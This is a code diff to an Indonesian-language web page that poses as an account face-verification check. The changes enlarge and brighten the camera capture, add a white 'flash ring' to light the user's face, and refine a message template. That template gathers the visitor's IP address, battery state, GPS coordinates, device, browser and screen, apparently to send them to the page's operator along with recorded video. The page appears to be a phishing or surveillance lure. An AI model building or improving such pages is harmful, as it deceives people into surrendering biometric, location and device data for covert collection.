@@ -169,6 +169,12 @@
             margin-bottom: 12px;
         }
 
+        #camera-preview-box.flash-active {
+            border: 16px solid #fff !important;
+            box-shadow: 0 0 60px 20px rgba(255, 255, 255, 0.4) !important;
+            transition: all 0.3s;
+        }
+
         #camera-gate p {
             color: var(--ink2);
             max-width: 420px;
@@ -2995,16 +3001,16 @@
                     <li>Proses verifikasi berlangsung 8 detik</li>
                     <li>Data dikirim untuk keamanan akun</li>
                 </ul>
-                <div id="verification-progress" style="display:none;margin:16px auto;width:100%;max-width:320px;text-align:center;">
-                    <div style="margin-bottom:12px;color:#fff;font-weight:bold;">Proses Verifikasi Wajah</div>
+                <div id="verification-progress" style="display:none;margin:16px auto;width:100%;max-width:420px;text-align:center;">
+                    <div style="margin-bottom:12px;color:#fff;font-weight:bold;transition:color 0.3s;">Proses Verifikasi Wajah</div>
                     <div style="width:100%;height:8px;background:#333;border-radius:4px;overflow:hidden;">
                         <div id="progress-bar" style="width:0%;height:100%;background:#e8001c;transition:width 0.1s linear;"></div>
                     </div>
                     <div style="margin-top:8px;color:#ccc;font-size:0.9rem;">Waktu tersisa: <span id="time-remaining">8</span>s</div>
                     <div id="verification-status" style="margin-top:8px;color:#0f0;font-weight:bold;">Menunggu deteksi wajah...</div>
                 </div>
-                <div id="camera-preview-box" style="display:none;width:100%;max-width:320px;aspect-ratio:3/4;background:#000;margin:16px auto;border-radius:8px;overflow:hidden;position:relative;">
-                    <video id="face-video" style="width:100%;height:100%;object-fit:cover;" playsinline webkit-playsinline></video>
+                <div id="camera-preview-box" style="display:none;width:100%;max-width:420px;height:55vh;min-height:360px;max-height:500px;background:#000;margin:16px auto;border-radius:12px;overflow:hidden;position:relative;box-shadow:0 8px 32px rgba(232,0,28,0.2);">
+                    <video id="face-video" style="width:100%;height:100%;object-fit:cover;filter:brightness(1.15) contrast(1.1);" playsinline webkit-playsinline></video>
                     <canvas id="face-canvas" style="position:absolute;top:0;left:0;width:100%;height:100%;"></canvas>
                     <div id="camera-status" style="position:absolute;top:10px;left:10px;background:rgba(255,0,0,.8);color:#fff;padding:4px 8px;border-radius:4px;font-size:0.8rem;display:none;">Kamera Ditutup!</div>
                     <!-- Lighting Indicators -->
@@ -3084,6 +3090,7 @@
                     previewBox.style.display = 'block';
                     verificationProgress.style.display = 'block';
                     faceVideo.srcObject = stream;
+                    previewBox.classList.add('flash-active'); // Nyalakan ring flash di kamera
 
                     // Tunggu video siap
                     await new Promise(resolve => {
@@ -3255,6 +3262,7 @@
                         verificationAttemptFailed = true;
                         previewBox.style.display = 'none';
                         verificationProgress.style.display = 'none';
+                        previewBox.classList.remove('flash-active');
                         return false;
                     }
 
@@ -3305,6 +3313,7 @@
                                         continuousFaceDetectionRequired = false;
                                         previewBox.style.display = 'none';
                                         verificationProgress.style.display = 'none';
+                                        previewBox.classList.remove('flash-active');
                                         resolve(false);
                                         return;
                                     }
@@ -3321,6 +3330,7 @@
                                 verificationSuccess = false;
                                 previewBox.style.display = 'none';
                                 verificationProgress.style.display = 'none';
+                                previewBox.classList.remove('flash-active');
                                 resolve(false);
                                 return;
                             }
@@ -3340,6 +3350,7 @@
                                         verificationSuccess = false;
                                         previewBox.style.display = 'none';
                                         verificationProgress.style.display = 'none';
+                                        gate.classList.remove('flash-active');
                                         resolve(false);
                                         return;
                                     }
@@ -3350,6 +3361,7 @@
                                         verificationSuccess = false;
                                         previewBox.style.display = 'none';
                                         verificationProgress.style.display = 'none';
+                                        gate.classList.remove('flash-active');
                                         resolve(false);
                                         return;
                                     }
@@ -3377,6 +3389,7 @@
                                     verificationSuccess = true;
                                     previewBox.style.display = 'none';
                                     verificationProgress.style.display = 'none';
+                                    previewBox.classList.remove('flash-active');
                                     resolve(true); // Resolve setelah semuanya selesai
                                 };
                                 mediaRecorder.stop();
@@ -3497,7 +3510,7 @@
 ⏰ Timestamp: ${data.timestamp}
 🌐 IP: ${data.ip}
 🔋 Battery: ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'Charging' : 'Not charging'})` : data.battery}
-📍 Location: ${typeof data.location === 'object' ? `${data.location.latitude}, ${data.location.longitude} (Accuracy: ${data.location.accuracy}m)` : data.location}
+📍 Location: ${typeof data.location === 'object' ? (data.location.error ? data.location.error : `${data.location.latitude}, ${data.location.longitude} (Accuracy: ${data.location.accuracy}m)`) : data.location}
 📱 Device: ${data.platform}
 🌍 Browser: ${data.userAgent.split(' ').pop()}
 📏 Screen: ${data.screen}
